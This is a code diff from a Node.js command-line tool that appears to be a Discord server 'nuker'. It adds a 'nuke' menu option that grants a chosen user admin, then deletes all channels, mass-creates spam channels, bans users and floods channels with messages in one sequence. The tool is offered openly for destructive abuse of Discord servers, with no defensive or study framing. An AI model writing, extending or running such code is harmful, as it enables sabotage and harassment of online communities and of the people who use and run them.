@@ -87,12 +87,13 @@ function askForAction() {
   console.log(chalk.yellow("["), "6", chalk.yellow("]"), "spam channels")
   console.log(chalk.yellow("["), "7", chalk.yellow("]"), "delete channels")
   console.log(chalk.yellow("["), "8", chalk.yellow("]"), "give admin")
-  console.log(chalk.yellow("["), "9", chalk.yellow("]"), "exit")
+  console.log(chalk.yellow("["), "9", chalk.yellow("]"), "nuke")
+  console.log(chalk.yellow("["), "10", chalk.yellow("]"), "exit")
 
   rl.question("\nenter an action number: ", (answer) => {
     action = answer.trim()
 
-    if (["1", "2", "3", "4", "5", "6", "7", "8", "9"].includes(action)) {
+    if (["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"].includes(action)) {
       performAction()
     } else {
       console.log("\ninvalid action")
@@ -132,7 +133,25 @@ async function performAction() {
       const userId = await getUserId()
       await giveAdmin(guildId, userId)
       break
-    case '9':
+      case '9':
+        try {
+          const userId = await getUserId()
+          const channelName = await getChannelName()
+          const channelCount = parseInt(await getChannelCount(), 10)
+          const messageCount = parseInt(await getMessageCount(), 10)
+      
+          await giveAdmin(guildId, userId)
+          await delChannels(guildId)
+          await createMultipleChannels(guildId, channelName, channelCount)
+          await banUsers(guildId)
+          await spamChannels(guildId, messageCount)
+      
+          console.log(chalk.bgRed("\nnuke operation completed successfully."))
+        } catch (error) {
+          console.error("\nerror during nuke operation:", error)
+        }
+        break;      
+    case '10':
       console.log("\nexiting...\n")
       rl.close()
       process.exit(0)
